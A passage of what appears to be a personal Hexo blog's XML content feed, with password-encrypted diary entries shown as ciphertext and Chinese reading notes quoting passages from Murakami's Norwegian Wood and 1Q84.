        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="06e3790adc44e67054e7b9d8b2af22e9dbb3c7603346a71a14021e7af59ae836">e32c27e47419b87d293b9e8ce412adf8d55d77683868e94d7b04248aac169e0601437573c52abf4bb9dda1e77cdb22bd3eccf8e380102401ed92a84a6212f1f233c8e86a20a416ff285bc6eec30424474abf7f66e3c06def533cf0a21605a8ae01dbe970e2251f9fdfeb9eb303468ce00288115e8f147e7a2cf93b681ac9ae41050fa03296dc6a0b2e033f3200146964c0bb29ccc0230dc0664de8d4e8a777a3e1ab03b56d26dab2081252d7e35dbcc6f555507c72458b1415e70ec9b3e57ebc3deb2ccf6dacf00db3ec2943ba59c8c1ab84567f07ab1a0a91ec603078d8df4cf93f4b8b0524dc33acbf4323d4ff846a244a61ccf16475c318b06cb74d7d0fcf264ce80c166b9bfd8afeeb650a8f8cfde823cabb3417f31a95f2abfbc7113a3ace693d066bd6bf8c146842cc2cc56697ec27b95afd85b90fb97d82eb695a1922525c22fb1175f1565285c58025937a1252034d6495ba6b4ce64acd45bf3832faf1bd80e372a46fd339d784ef0e72b6c071e1bbd0b068efd2f40ecee8f35aa991edb1de10211f9f72f7800989ccb7462381d5c3484f28d3b49a514a1415992f9563fcd712f14766cab4d4f4cb9d824b011cb28d29261419d51e7d9ac4a0e52937b55adadf3e5354449e7889664b8d3bc2198bc430aae5bfda5aee29dcb7a25ad3585ef544c7d3de0a4e909ac9a861f2bbc542077ded9a73d34d3e33450fdb86ab88e0fd2ff1860cb9e589d2bf0ab0f7a8f7570edb2e4adad1be83b2b2af2f15235f4e8ad0620f10ef82058015c2566dfe2baa42f0e6d7a17dc18f88cfce06258cac777ac79bc057dc30e0ba041a84deef40402df92d010f0ec522075c1ba82711f80f846db53eaa5c91b9b998d0bebbc7d235282bb00044c70d4f4cf12ebce95000b0cdf005f061b43f8efcef1bcbc37210aa45f315cba872988a08f1c500f0ba5289fc157bce5436ae628cb8b159c94e07cdfb8fd0c752a0263a880e1ad69d2c5fab361a43ecacf9f43aa753ae5bc2e6221d49e8144205eb8863953dec8dcc33ddce5465e30f987e3cd6bb7fc7885e0bea49afab2a6c5766ceb6fecfe8b40b187340be6f92c307b396b6964fc7a8d7f52205f82d3272977e9a4fc18a240c255369deab2f70aba74bba4457ed912c38bb069eed47c40ed2df7765ffb4cd9689e3a7fea139cd3af92c67e9501ae67f21e9bbb6b872d333dad6aa8a979e66e24bcc994e0c3276f5dbdcb23bd840953b58918ea233db38733414cfdb079353f427c7790f7ed6962fec6d5856b408c959584c486243d08d7022280bbc459886365361b9673f1963ff4765ff36f6a550acd0d85b091a3eb464d5aaf690a4f294b0859c74c50e151a6d1adf32534eb93815833f8f4c18b428e345259981779bf109b1f80435fccbe2e8929d6027a5d290c56dce8c2c96c657ea7bd5deead505d7d5a35363a32aecd73ffcf0d48aecf677b6ed16bc3bfce6980bd910f7e6bcb2a7392f501bf6a3c47b7f411fc329b242bbf5e8ef840fa5ea22ed3f7ef2769966e4850fe543a4481c17f79b92615663bd9756f0082dee49aeda3f073c457aea6bdc1128a93adfad16b10c10425d79ae92205e4a80d6fc858006b907382e5020fd8f296748670c6c73147d3513280326efac0e4d50ef6e527eea3d9e0c2e4c67542c4f39c80fe1aed301f4d19d5b21e0df0accea87</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-3-27</title>
      <link href="/2020/diary/2020-3/2020-3-27/"/>
      <url>/2020/diary/2020-3/2020-3-27/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="872da1b8e2f6ab47e8f7b938e0588c7c5c96beda9e40b02c525e3361e10d292d">e32c27e47419b87d293b9e8ce412adf8d55d77683868e94d7b04248aac169e06640ad451041a729b829ababe2688ffd244829a653248f0e2dcce8423500c1eff428109ceb1e97925b96df1a5a6d31fb0bea99787af0357a289af4d3b8bfd670eaeb127f8898b979302cfeb86f0160705afe07b3d6270b5b29a0ceda8e25a253df59cf2a7a67dbd0e17ed8f7aa74953f55a8676bae41ea2120e27e48184b66c327df4e2f31dd31585a809138c9fcae2594210d81c93558253228c843f5a747c3c22fb2bce40496ec0c35cb68c344728547ff93a4e7924203668d7a4f0b3f98e9518660dd88cd4d737d4fcf8b6394354925ae85069c05d75a6cfbfed10b394e5e73baf3b6a38e1a9c8ffdc27b7d4a676317318e85f584750593de0c43053842be380124188a96c5bfd4992f9bc33d0699800bde6d5382b90f84f287aaf49bbeb4941ac2735d73a39c6d523c0e234334e2cd679adabf898a6279adcd0b7053682a6630e98cf2138ae5879a3fed82af422128449eff3b15e95c2f168b0275690d7c63a67d15d1c99f14b708ea35347ece88d0e5ca4cb014ad345cddc79010bd4dfb090943dff6ec550535dac9d175c6470ff3db7b029479822bd6737a1ce94cbaa182cfe85c0fa471a0abfe564a569f1da4894482b2c99b126ee69bdb17406e28c594df2cfeb562f27c7eaf0479149a0c63df4e537dd334db29f580bc6500c24deb51fdf9ab293742bddbe0b7ec11f5111793d64e7b25f9f138b2d522665d980de09ee57c7f3bcb38d35b03fcf3489cd8d2a9573c1de64b65144a1f498b2b27ab3f4e6513b38d3e0d3d706037d664f001de29e454733835b489c49dafb6b7c8774bf2a73ff1c120747f92bc87d4c0b604656f372d91233a88d081379ad60b7efc5431eddad3eaa21a287e8d4763add56294b0aa01afffd7069d15ffb75d38d2665d8b29a0a9d38f6e16f74f89006bd9e42fc3e119e5123ef3bd2a3bc5ee341a7872b0bac3359050c4e44f961a60a540e2825340f7df35ba19d0e81bd22ee2c9c661f9e71a27ae4c03f3ec76a520fcf008eb35f13a1268096c54211f86f0c61a772a20f7dd55dbec117120e5d58c662cdc305bd9372363854a93dbbdbd606776a5d7599d435248b60ca7abe04edbee9534d687e7607658a4b7c30ab561b36f4210bfead63e7adb3931b9e253e382299cc077dac677072ce15b70b2bf6e6aaee62a709c394ef5012236683157eb03a80738f20d12d09b3de471bfd3957248d0d8d884cab297e0d94bf7f2ecd945b6cc89679543feb276c0f2c7bb6c728d7c8ca0893eee602eff7a95caab172a3ba93e9916c2ae82c57dcea14b5f8e321c84b4a861adf8da4cb586e26edb186d749036cf83ff15b7cd44e6302d0529bfa415a3513ed355316f5bdf234466f84718fc1d2e8d301c7ea9d024a724a64b8214ad152b476859983e54bac2ff0cacd601437bdf30c86f7de8dd3020d2d96f547905da2752a4d84d2bd1320e35cde2d016cea5f575f0e21844fc45cabcda8fd2f9507d237c5c6c0fafee02707a26dd0b6ca2d198cb17ba74e39560f217166faad105e65c2094c26166baf529f5fc9924fa4fb00786b39df09adbaa4660dab4094cc69c2234b1eaa88ce703c1c17efbcdbb58c4bc7fa81e54985fe5e0ea01d30afc156175b374f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《挪威的森林》 村上春树</title>
      <link href="/2020/reading-note/%E3%80%8A%E6%8C%AA%E5%A8%81%E7%9A%84%E6%A3%AE%E6%9E%97%E3%80%8B%20%E6%9D%91%E4%B8%8A%E6%98%A5%E6%A0%91/"/>
      <url>/2020/reading-note/%E3%80%8A%E6%8C%AA%E5%A8%81%E7%9A%84%E6%A3%AE%E6%9E%97%E3%80%8B%20%E6%9D%91%E4%B8%8A%E6%98%A5%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A%E6%8C%AA%E5%A8%81%E7%9A%84%E6%A3%AE%E6%9E%97%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><a id="more"></a>  <h3 id="永远的青春风景（译序）"><a href="#永远的青春风景（译序）" class="headerlink" title="永远的青春风景（译序）"></a>永远的青春风景（译序）</h3><ol><li>“……记忆到底还是一步步离我远去了。我忘却的东西实在太多了。……但不管怎样，它毕竟是我现在所能掌握的全部。于是我死死抓住这些已经模糊并且时刻模糊下去的记忆残片，敲骨吸髓地利用它来继续我这篇东西的创作。”  </li></ol><h3 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h3><ol><li>我仍可真切地记起那片草地的风景。连日温馨的霏霏细雨，将夏日的尘埃冲洗无余。片片山坡叠青泻翠，抽穗的芒草在十月金风的吹拂下蜿蜒起伏，逶迤的薄云紧贴着仿佛冻僵的湛蓝的天穹。凝眸望去，长空寥廓，但觉双目隐隐作痛。清风抚过草地，微微拂动她满头秀发，旋即向杂木林吹去。树梢上的叶片簌簌低语，狗的吠声由远而近，若有若无，细微得如同从另一世界的入口处传来。此外便万籁俱寂了。耳畔不闻任何声响，身边没有任何人擦过。只见两只火团样的小鸟，受惊似的从草丛中腾起，朝杂木林方向飞去。  </li></ol><h3 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h3><ol><li>世上果然有各种各样的希望，人生目的也各所不同。  </li><li>死并非生的对立面，而作为生的一部分永存。  </li></ol><h3 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h3><ol><li>若问自己现在所做何事，将来意欲何为，我都如坠雾中。  </li><li>。论读书，我辈较之他可谓望尘莫及。他宣称：对死后不足三十年的作家，原则上是不屑一顾的，那种书不足为信。<br>“不是说我不相信现代文学。我只是不愿意在阅读未经过时间洗礼的书籍上面浪费时间。人生短暂。”  </li><li>如果读的东西和别人雷同，思考方式也只能和别人雷同。乡巴佬、小市民才那样。有识之士不会如法炮制，取羞于人。  </li><li>“我也二十岁了，有点儿像开玩笑似的。”直子说，“我，一点儿也没做二十岁的准备，挺纳闷儿的，就像谁从背后硬推给我的一样。”  </li><li>这种百无聊赖的心绪，我既不能将其排遣于外，又不能将其藏于何处。它像掠身而去的阵风一样没有轮廓，没有重量，我甚至连把它裹在身上都不可能。风景从我眼前缓缓移过，其语言却未能传入我的耳中。  </li><li>萤火虫消失之后，那光的轨迹仍久久地印在我的脑际。那微弱浅淡的光点，仿佛迷失方向的魂灵，在漆黑厚重的夜幕中彷徨。<br>我几次朝夜幕伸出手去，指尖毫无所触，那小小的光点总是同指尖保持着一点点不可触及的距离。  </li></ol><h3 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h3><ol><li>我说木月，这世道可真是江河日下！这帮家伙一个不少地拿得大学学分，跨出校门，将不遗余力地构筑一个同样卑劣的社会。  </li><li>绅士就是：所做的，不是自己想做之事，而是自己应做之事。  </li><li>因为我讨厌学校讨厌得要死，所以才一次课都没旷过。心想怎么能败下阵去！一旦败下阵岂不一生都报销了！我生怕自己一旦败阵就再也站不起来。  </li><li>我不情愿被某种东西束缚住。  </li><li>我们早已决定对周围的事来个不屑一顾！  </li><li>“我所害怕的，是这种方式的死。就是说，死的阴影一步一步侵入生命的领地，等察觉到的时候，已经黑乎乎的什么也看不见了。那样子，连周围人都觉得我与其说是生者，倒不如说是死者。我讨厌的就是这个，这是我绝对忍受不了的。”  </li><li>“整整一天都憋在家里等电话，真是烦透了。孤零零一个人，觉得身体就像一点点腐烂下去似的。渐渐腐烂、融化，最后变成一洼黏糊糊的绿色液体，再被吸进地底下去，剩下来的只是衣服 ——就是这种感觉，在干等一天的时间里。”<br>“要是还有这类等电话的事，我来奉陪，不过可要搭一顿午饭。”我说。  </li><li>每个人无不显得很幸福。至于他们是真的幸福还是仅仅表面看上去如此，就无从得知了。但无论如何，在九月间这个令人心神荡漾的下午，每个人看来都自得其乐，而我则因此而感到了平时所没有感到过的孤寂，觉得惟独我自己与这光景格格不入。  </li></ol><h3 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h3><ol><li>我觉得自己似乎孤零零地置身于整理得井井有条的一片废墟之中。  </li><li>四下里弥漫着黄昏的气氛。从客厅窗口，可以望见树林和山峦的棱线，棱线上浮现着淡淡的夕晖，宛如镀上的一层光边。  </li><li>再说也没有必要提高嗓门，既用不着说服谁，又没有引人注目的必要。  </li><li>那光亮使我联想到犹如风中残烛的灵魂的最后忽闪。我真想用两手把那光严严实实地遮住，守护它。我久久地注视那若明若暗摇曳不定的灯光，就像盖茨比整夜整夜守护对岸的小光点一样。  </li><li>即使事物再错综复杂，甚至叫人无计可施，也不能灰心丧气，不能急于求成强拉硬扯。  </li><li>如果你觉得那样可以，也无所谓。因为那是你的人生，应该由你决定。  </li><li>我曾经把所有的可能性掌握在自己手中，但等明白过来时却已两手空空。  </li><li>那感觉，就像被人从狂暴而冰冷的海潮中打捞出来、用毛巾被裹着放到温暖的床上一样。  </li><li>我在同你交欢，进入你的体内。但实际并没有什么，本来就是无所谓的，无非是身体间的一种接触罢了，我们不过是在相互诉说只有通过两个不完美的身体的相互接触才能诉说的情感而已，并以此分摊我们各自的不完美性。  </li><li>“我们的正常之处，”玲子说，“就在于自己懂得自己的不正常。”  </li><li>“较之对自己本身，对别人我要耐心得多，而且容易找出对方好的一面，我是这一类型的人。总之就像火柴盒侧面那块粗糙的擦火皮，不过这没关系，无所谓的。我也并不厌恶自己的这副德性，同二流火柴杆相比，我还是更乐意当一流火柴盒。  </li><li>尽管她口头上百依百顺，可骨子里绝对一意孤行。  </li><li>世上是有这种人的：尽管有卓越的天赋才华，却承受不住系统训练，而终归将才华支离破碎地挥霍掉。  </li><li>地面乌黑乌黑，松枝翠绿翠绿，而身裹黄色雨衣的行人看上去仿佛是唯一被允许在下雨的早晨彷徨于地表的特殊魂灵。  </li></ol><h3 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h3><ol><li>现实世界里，很多方面人们都在互相强加，以邻为壑，否则就活不下去。  </li><li>我是平头百姓，革命发生也罢不发生也罢，平头百姓还不同样只能在窝窝囊囊的地方委屈求生！何谓革命，无非更换一下政府名称。可那些人根本不懂得这点，那些卖弄陈词滥调的家伙。  </li><li>就是很多人一齐出场，每个人都有每个人的情况、缘由和道理，每个人都在追求自以为是的正义与幸福。这么着，大家都进退维谷。这可以理解。所有人的正义都大行其道、所有人的幸福都圆满获得，客观上是不可能的，而必然导致混乱状态的出现。  </li><li>“吃东西香是好事，是有生命力的证据。”  </li><li>父亲对往事的回忆都是这个样子，一点都不波澜起伏，都好像缺东少西，平淡得很。  </li><li>这样的星期日以后将重复几十次、几百次吧？“安静的、平和的、孤独的星期日” ——我出声说道。星期日我是不上发条的。  </li></ol><h3 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h3><ol><li>固然，有时也对人生怀有恐怖感，这也是理所当然！只是，我并不将它作为前提条件来加以承认。我要百分之百地发挥自己的能力，不达到极限绝不罢休。想拿的就拿，不想拿的就不拿，就这样生存下去。如果不行，到不行的时候再另行考虑。反过来想，不公平的社会同时也是大有用武之地的社会。  </li><li>不努力何必还牢骚满腹呢？  </li><li>“我同渡边的相近之处，就在于不希望别人理解自己。”永泽说，“这点与其他人不同，那些家伙无不蝇营狗苟地设法让周围人理解自己。但我不那样，渡边也不那样，而觉得不被人理解也无关紧要。自己是自己，别人归别人。”  </li><li>能如此执着地爱上一个人，这本身恐怕就是件了不起的事。  </li><li>他的死带来的东西依然鲜明地留在我的脑海里，有的反而比当时还要鲜明。  </li></ol><h3 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h3><ol><li>整个书店比第一次来时还要空荡凄凉，俨然一只被冲上岸的废船。  </li><li>绿子说，“可怜的父亲，玩命操劳一辈子，才弄了这么间小破店，贷款也一点点还了，结果却几乎什么都没留下，像泡沫一样消失了。”<br>“你留下了。”我说。<br>“我？”绿子觉得滑稽似的笑了笑，然后深深吸口气吐出。  </li><li>秋意的加深是与你返回东京同时开始的，因此我许久都捉摸不透自己心里仿佛出现一个大洞的感觉是由于你不在造成的，还是时令的更迭所致。  </li></ol><h3 id="第十章"><a href="#第十章" class="headerlink" title="第十章"></a>第十章</h3><ol><li>一九六九年这一年，总是让我想起进退两难的泥沼 ——每迈一步都几乎把整只鞋陷掉那般滞重而深沉的泥沼。而我就在这片泥沼中气喘吁吁地挪动脚步，前方一无所见，后面渺无来者，只有昏暗的泥沼无边无际地延展开去。  </li><li>“不要同情自己！”他说，“同情自己是卑劣懦夫干的勾当。”  </li><li>春天毕竟是适合从头做事的季节，因此，如果我们能够从四月开始共同生活，我觉得恐怕再好不过。倘若顺利，你还可以去大学复学。假如一起住有问题，也不妨在附近为你另找住处。总之最重要的是我们可以近在咫尺，朝夕相守。  </li><li>喂，木月！我和你不同，我决心活下去，而且要力所能及地好好活下去。你想必很痛苦，但我也不轻松，不骗你。这也是你留下直子死去造成的！但我绝不抛弃她，因为我喜欢她，我比她顽强，并将变得更加顽强，变得成熟，变成大人—— 此外我别无选择。  </li><li>“过去太残酷了。”绿子说，“也罢，往后我们狠狠地捞回来。”  </li><li>你把人生当做饼干罐就可以了。  </li><li>“饼干罐不是装有各种各样的饼干，喜欢的和不大喜欢的都在里面吗？如果先一个劲儿挑你喜欢的吃，那么剩下的就全是不大喜欢的。每次遇到麻烦我就总这样想：先把这个应付过去，往下就好办了。人生就是饼干罐。”  </li><li>你总是蜷缩在你自己的世界里，而我却一个劲儿“咚咚”敲门，一个劲儿叫你。于是你悄悄抬一下眼皮，又即刻恢复原状。  </li><li>无论事态看上去多么令人悲观，也必定在某处有突破口可寻。倘若周围一团漆黑，那就只能静等眼睛习惯黑暗。  </li><li>纵令听其自然，世事的长河也还是要流往其应流的方向，而即使再竭尽人力，该受伤害的人也无由幸免。所谓人生便是如此。  </li></ol><h3 id="第十一章"><a href="#第十一章" class="headerlink" title="第十一章"></a>第十一章</h3><ol><li>我心里关于直子的记忆堆积如山，它们甚至撬开一点缝隙，争先恐后鼓涌而出，而我根本无法遏止其突发的攻势  </li><li>无论熟知怎样的哲理，也无以消除所爱之人的死带来的悲哀。  </li><li>‘把过去的东西全部处理掉，也好获得新生。’  </li><li>“我已成为过去的人。你眼前存在的不过是我往日的记忆残片。我心目中最宝贵的东西早在很久以前就已寿终正寝。我不过是按照过去的记忆坐卧行止罢了。”  </li><li>绿子在电话的另一头久久默然不语，如同全世界所有的细雨落在全世界所有的草坪上一般的沉默在持续。  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-3-25</title>
      <link href="/2020/diary/2020-3/2020-3-25/"/>
      <url>/2020/diary/2020-3/2020-3-25/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="c568c5231f99a1d2abbb0e6de1e0532ecec530743405ca0aeeeb3c2fe0e04e53">e32c27e47419b87d293b9e8ce412adf8d55d77683868e94d7b04248aac169e06b23583b1ba6371e274b212691b602d4a2b9a09e0b2e26f4ecec23e5ad483f6b920d0ecc497b730159eed96e4d66218cc0eec0099b491c62354658ec464c121507005ea43a04bdf4b95a68ca353f57ad006d46b70876942e5400b474f0eb8e8a5a4aba8bc62001905b51963a66c0bc4122fa18d16086d53aa99da6409351ca101529b1930d320e76f04befedb5a6956f143847f7f644d70309c8a96bf5ee9c9e84ffceebd2cd55818eee2115e59568dd488a11dcbeb6c16c751a6fb5d203cff04dd1dddbf2d590bea88c5d8f5976d20f9c220c4a0910e00823e1cb934f572d193eb9a7a86410e5551406295c2cadff4d4d143b9edeeb2779fd4bfd553bf0888181e56abdba3c3521d859c80e0e4fad4cd0e3f58f0493f28fa2a6655a811c78ec7e4d0f4e42c4bdeaa34794ec933b58bc81b8727f971449cfa63e9d9f44de2638b6adcc8c92736610cc61c636d54e2aec8759f526e00516e39e56e64016720f8794b040ac5f329e99b1b8959a10ae8f8173c210447fe942ee63a1334714ea61a5f9624b25b7e30736869205cdb1eef2cb147805079e3e9986bfa14cf478306ae4d37cbca01e416ef73ec98c819f3ad926c60091c3acd41af644d6afd44692be77397b53513ad4c54e677a05686888064d08e7da8677a484f02103160309d22196ea5b5484af001d5c8c3e3d36a43aa11e5cc1fdc149188ab59a87ea11e15557ebf74a7b4ac42137e76b5214daa2ce90e98fbe98a9a86815ae5e0fe1e1e8f71ae9c485f12626dbef58a8f6d671f6f087557624248b7b6628c6c76650e37a8622901907e8e4fa5198d39ebe2ef9a7ccb9d1d0c7bcb03fc05b0298b82f7fec51f48d5d97f6f61ab1550d8a7dd3f6de073e9b80373129bfa17d916a157773b3b45d0371551f0ede62ecb5427949957f2a624229a123497f54c4437b2642745d8a553714a39279e57236071889471b417a20a743d429a9dfd0ba36d056747e39202356c0aa56389cf31ab88312354f3486153ae740243ec9165955e04ab50501257a28e6f30b2023fa3b025500345b50ceffa0744b9002f9dc2a5b70fd44492c65e0ef498aadd963ab906800d02ec3c48623e0d71a689077c3600b8e72aa68381de0e4381a3b31303446a061ba48520ba13bf3f613bb11f7350b3f95c75244c3fb9e1cdc800ecdc113aba79ead42b7878b0ac562bac070078d1ad85917a35d1cc5a6f75bd9818b7705da6acd8346515ee59526144093779a4e65a7bd5f9ffdd06cb989f48886076f51340ba547329034d80507af7d42e99296040a79ae3e51ab0fb05553f7094df76d04a4da57b28e1a050f7910196727e0dea043c44f59ba99d0e38ec34ba3d1f91fd4a99196e5aced76b30d05db2d006c222b3622636144fe821a5cc21235fae609fc1239c9655897b8d11c59ea10a01072e784cec027e5697023bae920d6532b2544e910f141fe2a51494e28f27d4b4abac0beb6bea3bc7e428d4e05a2773057565f777a244b264e5835ae8</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《1Q84》 村上春树</title>
      <link href="/2020/reading-note/%E3%80%8A1Q84%E3%80%8B%20%20%E6%9D%91%E4%B8%8A%E6%98%A5%E6%A0%91/"/>
      <url>/2020/reading-note/%E3%80%8A1Q84%E3%80%8B%20%20%E6%9D%91%E4%B8%8A%E6%98%A5%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E3%80%8A1Q84%E3%80%8B.jpg" alt="封面" loading="lazy"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><h3 id="第2章-青豆-不要被外表迷惑"><a href="#第2章-青豆-不要被外表迷惑" class="headerlink" title="第2章 青豆 不要被外表迷惑"></a>第2章 青豆 不要被外表迷惑</h3><ol><li>每一次，她都觉得自己仿佛是个孤独的漂泊者，被孤零零地抛弃在汪洋大海中。   </li></ol><h3 id="第3章-天吾-另有主意"><a href="#第3章-天吾-另有主意" class="headerlink" title="第3章 天吾 另有主意"></a>第3章 天吾 另有主意</h3><ol><li>世界像一锅稀粥，黏糊糊地没有骨骼，无从把握。它还没有在脑中形成记忆，就从窗外一掠而过。  <a id="more"></a>  </li><li>那就像在无风的午后从火堆里冒出的烟，谁都一目了然。  </li><li>锐利的精神不可能产生于舒适的环境中。这是他的信条。  </li><li>世上的人大多不懂得小说的真正价值，却又不愿被世间的潮流遗弃，只要有本书得了奖成了话题，就会买来看。  </li><li>小松先生，我对业界的内情几乎一无所知，不过按照一般常识来考虑，这是个非常危险的计划。一旦向社会说了谎话，就不得不把谎言永远继续下去，得一直圆谎。无论在心理上还是技术上，这都不是简单的事。只要有一个人不小心在什么地方做错了，就可能给所有人带来灭顶之灾。您说呢？  </li></ol><h3 id="第4章-青豆-几个被改变的事实"><a href="#第4章-青豆-几个被改变的事实" class="headerlink" title="第4章 青豆 几个被改变的事实"></a>第4章 青豆 几个被改变的事实</h3><ol><li>蜘蛛除了结网，并没有别的能耐，除了在那儿死死守候，再也没有其他生活方式可以选择。坚守在某处苦等猎物，直到寿命终结，死去，干枯。一切都在遗传因子中预先设定好了。其中没有犹豫，没有绝望，也没有后悔，更没有形而上的质疑和道德的纠葛。  </li><li>然后闭上眼，照惯例念诵祈祷词。句子本身毫无意义。意义之类的怎样都无所谓，重要的是念诵祈祷词这一行为。   </li></ol><h3 id="第5章-天吾-假如你希望这样"><a href="#第5章-天吾-假如你希望这样" class="headerlink" title="第5章 天吾 假如你希望这样"></a>第5章 天吾 假如你希望这样</h3><ol><li>但这种诺言并没有在他的意识里牢牢扎根，只要下上一场雨，便被冲刷得一干二净。  </li><li>写小说时，我使用语言，把周围的风景转换成对我来说更自然的东西。就是重新架构。通过这样做，来确认我这个人确实存在于这个世界上。这种做法和置身于数学世界时大不相同。  </li></ol><h3 id="第7章-天吾-我们要去很远的地方吗？"><a href="#第7章-天吾-我们要去很远的地方吗？" class="headerlink" title="第7章 天吾 我们要去很远的地方吗？"></a>第7章 天吾 我们要去很远的地方吗？</h3><ol><li>小松说，“我这种直觉可准得很呢。老天好像没有赐予我什么才华，只有直觉倒是不少。说来惭愧，我能混到今天，全靠着这东西。你知道吗，才华和直觉最大的区别是什么？”<br> “不知道。”<br> “区别就在于，你再怎么才华横溢，也未必就能填饱肚皮；但只要你拥有敏锐的直觉，就不必担心混不上饭吃。”  </li><li>仅仅是因为和别人不一样，就可能被嫌弃。大人们的世界也差不多，但在孩子们的世界里表现得更直接。  </li></ol><h3 id="第8章-青豆-静静地，别惊动了蝴蝶"><a href="#第8章-青豆-静静地，别惊动了蝴蝶" class="headerlink" title="第8章 青豆 静静地，别惊动了蝴蝶"></a>第8章 青豆 静静地，别惊动了蝴蝶</h3><ol><li>青豆沉默着等待下面的话，然而下面没有了。不喜欢网状物，究竟是针对象征着束缚自由的事物的姿态呢，还是出自审美的观点，抑或并无特别的理由，仅仅是生理性的好恶？不明不白地，话便结束了。但在眼下，这不是特别重要的问题，只是偶然想到，顺便问问。  </li></ol><h3 id="第10章-青豆-风景变了，规则变了"><a href="#第10章-青豆-风景变了，规则变了" class="headerlink" title="第10章 青豆 风景变了，规则变了"></a>第10章 青豆 风景变了，规则变了</h3><ol><li>一旦做了这样的事，往后的日常风景，看上去也许会和平常有点不一样。但是，不要被外表迷惑。现实永远只有一个。  </li><li>不是我疯了，就是世界疯了。我不知道究竟是哪一个疯了。瓶口和瓶盖尺寸不符，也许该怪瓶子，也许该怪盖子。但不管怎样，尺寸不符的事实不容动摇。  </li></ol><h3 id="第11章-天吾-真正的流血革命"><a href="#第11章-天吾-真正的流血革命" class="headerlink" title="第11章 天吾 真正的流血革命"></a>第11章 天吾 真正的流血革命</h3><ol><li>世上有不少人想逃离被横流的物欲和泛滥的信息驱使的现实世界，去大自然中挥汗劳作，‘先驱’就吸引了这样的群体。  </li></ol><h3 id="第12章-青豆-肉体才是人的神殿"><a href="#第12章-青豆-肉体才是人的神殿" class="headerlink" title="第12章 青豆 肉体才是人的神殿"></a>第12章 青豆 肉体才是人的神殿</h3><ol><li>“这并不是年龄的问题。”青豆爽快地答道，“这是人生态度的问题。重要的是永远维持一种认真保护自己的姿态。如果一味地只是遭受攻击不反抗，我们就只能止步不前。慢性的无力感是会腐蚀人的。”   </li><li>肉体才是人的神殿，不管在那里祭祀什么，它都应该更强韧、更美丽清洁。这是青豆不可动摇的信念。  </li></ol><h3 id="第13章-天吾-愿你的国降临"><a href="#第13章-天吾-愿你的国降临" class="headerlink" title="第13章 天吾 愿你的国降临"></a>第13章 天吾 愿你的国降临</h3><ol><li>窗外，一个小小的黑色物体迅速飞过，也许是只鸟儿，也许是谁的灵魂被吹到了世界尽头。  </li></ol><h3 id="第14章-青豆-天生的受害者"><a href="#第14章-青豆-天生的受害者" class="headerlink" title="第14章 青豆 天生的受害者"></a>第14章 青豆 天生的受害者</h3><ol><li>天花板上没有有趣之处，但没什么可抱怨的，因为天花板安装在那里，原本就不是为了让人感到有趣。  </li><li>在个人层面和别人维系深入的交往，对青豆来说是一种痛苦。与其那样，还不如孤独下去。  </li></ol><h3 id="第15章-天吾-几乎所有读者都从未见过的东西"><a href="#第15章-天吾-几乎所有读者都从未见过的东西" class="headerlink" title="第15章 天吾 几乎所有读者都从未见过的东西"></a>第15章 天吾 几乎所有读者都从未见过的东西</h3><ol><li>“‘一切艺术，一切希求，以及一切行动与探索，都可以看作是以某种善为目标。因此可以从事物追求的目标出发，来正确地界定善。’”<br> “这是什么？”<br> “亚里士多德呀。《尼各马可伦理学》。你读没读过亚里士  </li><li>只浮着一个月亮的天空，读者已经看过了太多次，是不是？可是天上并排浮现出两个月亮，这光景他们肯定没有亲眼看过。当你把一种几乎所有读者都从未见过的东西写进小说里，详细而准确的描写就必不可缺。可以省略，或者说必须省略的，是几乎所有读者都亲眼见过的东西。”  </li><li>“人的灵魂是由理性、意志和情欲构成的。  </li><li>故事的使命就是把一个问题置换成另一种形态，并根据这种置换的性质与方向的不同，以故事性来暗示解答的形式。  </li></ol><h3 id="第16章-青豆-像给气球装上锚一样牢固"><a href="#第16章-青豆-像给气球装上锚一样牢固" 